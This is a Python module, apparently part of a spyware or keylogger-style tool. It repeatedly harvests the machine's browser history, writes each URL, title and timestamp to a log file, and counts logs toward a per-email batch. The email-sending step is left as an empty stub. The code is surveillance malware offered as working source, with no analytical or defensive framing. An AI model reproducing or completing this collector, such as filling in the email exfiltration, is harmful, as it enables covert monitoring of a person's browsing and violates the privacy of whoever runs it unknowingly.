from browserhistory import get_browserhistory, get_username
from utils.utils import log, handle_counter
from config import LOGS_DIRECTORY_PATH, BROWSER_INTERVAL, BROWSER_LOGS_PER_EMAIL
from time import sleep
from os import _exit


class BrowserLogger:
    def __init__(self):
        self.logs_directory_path = LOGS_DIRECTORY_PATH or ""
        self.interval = BROWSER_INTERVAL
        self.counter = 0
        self.counter_max = BROWSER_LOGS_PER_EMAIL
        self.running = True

    def log_browser_history(self):
        browser_history = get_browserhistory()
        if not browser_history:
            return

        for browser, history in browser_history.items():
            for search in history:
                log(f"{search[2]}: {search[1]} ({search[0]})", "browser_log.txt", False)

    def run(self):
        try:
            while self.running:
                self.log_browser_history()
                self.counter += 1
                if handle_counter(self.counter, self.counter_max):
                    # email logic here
                    pass
                sleep(self.interval)
        except Exception as e:
            log("ERROR WHILE LOGGING BROWSER:", "errors.txt")
            log(e)


def main():
    browser_logger = BrowserLogger()
    try:
        browser_logger.run()
    except Exception:
        print("An error occured while logging browser.")
        print("See full error here: ")  # TODO: Add file path of error log


if __name__ == "__main__":
    _exit(main())
